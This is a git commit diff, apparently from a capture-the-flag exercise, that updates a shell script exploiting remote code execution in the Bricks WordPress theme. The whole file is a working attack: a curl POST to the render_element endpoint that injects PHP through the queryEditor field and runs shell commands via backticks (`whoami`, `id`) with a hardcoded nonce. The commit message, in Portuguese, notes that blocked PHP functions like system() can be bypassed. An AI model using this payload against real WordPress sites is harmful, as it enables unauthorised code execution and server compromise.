9a65efa060b23217531ba73936fda52acfb2c7c7
Filipe Gomes <ffgomes2004@gmail.com>
2026-03-12 21:01:55 +0000

    Permite inserir codigo PHP, mas algumas funçoes PHP estao bloqueadas como system(), exec() tbm deve estar, etc... mas dá para contornar

--- bricks_rce_payload.sh
+++ bricks_rce_payload.sh
@@ -1,15 +1,21 @@
-curl -k -X POST https://[HOST]/wp-json/bricks/v1/render_element \
+# Script used to be able to run remote code executed in an exploit of Bricks render_elements - Bricks is a theme that can be used in WordPress
+
+HOST=bricks.thm
+
+#NONCE=${curl }
+
+curl -k -X POST https://$HOST/wp-json/bricks/v1/render_element \
   -H "Content-Type: application/json" \
   -d '{
   "postId": "1",
-  "nonce": "[NONCE]",
+  "nonce": "aea121d468",
   "element": {
     "name": "carousel",
     "settings": {
       "type": "posts",
       "query": {
         "useQueryEditor": true,
-        "queryEditor": "throw new Exception(`id`);",
+        "queryEditor": "throw new exception(`whoami`);",
         "objectType": "post"
       }
     }
